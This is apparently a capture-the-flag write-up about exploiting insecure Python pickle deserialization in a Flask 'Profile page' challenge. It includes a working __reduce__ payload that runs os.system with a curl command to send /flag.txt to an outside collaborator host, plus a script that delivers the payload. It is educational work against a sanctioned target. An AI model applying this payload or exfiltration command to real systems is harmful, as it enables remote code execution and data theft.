---
title: 'Wizer CTF - Pickle Deserialization RCE'
description: 'Pickle Deserilization RCE CTF writeup from Wizer CTF.'
pubDate: 'Feb 7 2024'
heroImage: '/PythonPickleRCE.jpg'
tags: ['CTF', 'Web', 'RCE', 'Python']
---

Wizer recently hosted a 6-hour Blitz CTF consisting of 6 challenges to be solved in 6 hours. These challenges varied in difficulty, as measured by hot peppers ranging from 1-5. This challenge, titled "Profile page" scored 4/5 peppers.

For this challenge, we are given a URL and the Python source code of the application behind it. It is a small application written in Python using Flask and Pickle. As soon as I saw it was using Pickle, I already knew it was going to be an interesting deserialization challenge!

The challenge on the CTF dashboard can be seen here:
![Challenge from CTF dashboard](/src/assets/WizerPickleRCE/Chall4.jpg)

## Solution

The source code of the app is given:
```py
from flask import Flask, request, render_template
import pickle
import base64

app = Flask(__name__, template_folder='templates')
real_flag = ''
with open('/flag.txt') as flag_file:
    real_flag = flag_file.read().strip()

class Profile:
    def __init__(self, username, email, bio):
        self.username = username
        self.email = email
        self.bio = bio

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        bio = request.form.get('bio')

        if username and email and bio:
            profile = Profile(username, email, bio)
            dumped = base64.b64encode(pickle.dumps(profile)).decode()
            return render_template('profile.html', profile=profile, dumped=dumped)    

    load_object = request.args.get('load_object')
    if load_object:
        try:
            profile = pickle.loads(base64.b64decode(load_object))
            return render_template('profile.html', profile=profile, dumped=load_object)
        except pickle.UnpicklingError as e:
            return f"Error loading profile: {str(e)}", 400

    return render_template('input.html')

@app.route('/submit_flag/<flag>', methods=['GET'])
def flag(flag):
    return real_flag if flag == real_flag else 'Not correct!'

if __name__ == '__main__':
    app.run(debug=True)
```

As we can see, there is not a lot of functionality on the site other than on the ``/profile`` endpoint. Reading into the code, we can see that if we supply a username, email, and bio, it will use that to create a ``Profile`` object using Pickle and our data.
Reading a bit further, we can see that we also have the option to load a ``Profile`` object using the ``load_object`` parameter. This is very interesting to us because it gives us a way to give ``pickle.loads()`` data that we fully control.

Reading up on the [Pickle documentation](https://docs.python.org/3/library/pickle.html) it says the following:

> The pickle module **is not secure**. Only unpickle data you trust.<br>
> It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

So our goal here is to create an object that gives us code execution. Reading from the [documentation](https://docs.python.org/3/library/pickle.html#pickle.loads) again, it says the following regarding ``pickle.loads()``:
> Return the reconstituted object hierarchy of the pickled representation *data* of an object.

Our goal now is to create an object that, when reconstituted, runs commands on the server.
For this, we will need to choose our command and create a pickled object with our payload. Since we just need the flag for this challenge, I'll just be using a simple Curl payload:
```bash
curl http://9dnou0awv3b99xsbgqre8kwl5cb3ztni.oastify.com/$(cat /flag.txt | base64 -w 0)
```

This will send a request to my BurpSuite Collaborator listener with the flag in the URL, but in theory, you could set up a reverse shell to get a stable connection and actually look for the flag. We do, however, know that the flag is located at ``/flag.txt``, so that won't be needed here.


So, let us create a Python object and give it our payload:
```python
import pickle
import base64
import os
import requests

class RCE:
    def __reduce__(self):
        cmd = ('curl http://9dnou0awv3b99xsbgqre8kwl5cb3ztni.oastify.com/$(cat /flag.txt | base64 -w 0)')
        return os.system, (cmd,)

pickled = pickle.dumps(RCE())
payload = base64.b64encode(pickled).decode()
print(payload)

req = requests.get(f'https://dsw3qg.wizer-ctf.com/profile?load_object={payload}')
print(req.status_code)
```

> It is important that you run this script from an OS that matches the target OS. In this case, the target is running Linux, so make sure to run it on Linux. WSL also works, but Windows most likely **will not work**.

Here we create a custom object named ``RCE`` (the name does not matter), and we set the ``__reduce__`` method to return our command using ``os.system``. This command will then be run when the server tries to load our custom object.
Once it is created, we then base64 encode it, print it (just for debugging if anything goes wrong), and send it to the server. If everything goes well, it will return ``200``, and we will see a request in BurpSuite Collaborator:
![Flag request in Burp](/src/assets/WizerPickleRCE/Req.png)

Here we see that we have received the request! Now all there is left to do is just decode it from Base64 and send it to the flag server to mark it as solved!
We can simply decode it using our CLI:
![Base64 decoding flag](/src/assets/WizerPickleRCE/Flag.png)

And there we have the flag!<br>
``WIZER{'PICKL1NG_1S_DANGEROUS'}``

To solve the challenge, all we have to do is send a request to the following URL:<br>
```
https://dsw3qg.wizer-ctf.com/submit_flag/WIZER{'PICKL1NG_1S_DANGEROUS'}
```